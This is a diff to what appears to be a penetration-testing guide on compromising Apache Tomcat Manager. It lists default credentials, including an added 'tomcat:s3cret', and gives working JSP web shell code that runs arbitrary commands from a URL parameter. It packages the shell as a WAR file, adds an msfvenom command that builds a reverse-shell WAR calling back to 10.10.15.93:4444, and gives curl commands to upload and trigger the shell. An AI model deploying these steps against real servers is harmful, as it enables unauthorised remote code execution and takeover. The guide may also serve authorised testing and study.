@@ -27,6 +27,9 @@ Look for version info in page footer or in the "Server Status" page (if enabled)
 http://target:8080/manager/status
 ```
 
+
+---
+
 ## Exploiting Tomcat Manager by Uploading a WAR File
 
 - The Tomcat Manager app allows deployment of new applications.
@@ -43,6 +46,7 @@ Requires credentials (often weak or default):
 - `admin:admin`
 - `tomcat:tomcat`
 - `admin:password`
+- `tomcat:s3cret`
 
 #### Step 2: Upload a malicious WAR file
 There are public repositories such as GitHub, ExploitDB, and others that host ready-to-use WAR files containing web shells. You simply need to download the WAR file and upload it to the target server.For example:
@@ -51,11 +55,13 @@ There are public repositories such as GitHub, ExploitDB, and others that host re
 - ExploitDB offers several ready-made WAR shells available for download
 
 Another option is preparing a WAR file with a web shell. For example, create a simple JSP shell:
-```http
-<%@ page import="java.util.*,java.io.*"%>
+```bash
+# Create JSP webshell
+cat > shell.jsp << 'EOF'
+<%@ page import="java.io.*" %>
 <%
-if(request.getParameter("cmd") != null) {
-    String cmd = request.getParameter("cmd");
+String cmd = request.getParameter("cmd");
+if(cmd != null) {
     Process p = Runtime.getRuntime().exec(cmd);
     OutputStream os = p.getOutputStream();
     InputStream in = p.getInputStream();
@@ -67,6 +73,17 @@ if(request.getParameter("cmd") != null) {
     }
 }
 %>
+EOF
+
+# Package as WAR
+mkdir -p WEB-INF
+jar -cvf shell.war shell.jsp WEB-INF
+```
+
+You can also create it using `msfvenom`: 
+
+```bash
+msfvenom -a x86 -p java/jsp_shell_reverse_tcp LHOST=10.10.15.93 LPORT=4444 -f war -o shell.war
 ```
 
 #### Step 3: Use the Manager interface or curl to upload WAR
@@ -79,7 +96,7 @@ curl --user admin:admin --upload-file shell.war "http://target:8080/manager/text
 #### Step 4: Access the deployed shell
 
 ```http
-http://target:8080/shell/shell.jsp?cmd=id
+curl "http://target:8080/shell/shell.jsp?cmd=id"
 ```
 
 You can now run commands via the `cmd` parameter.
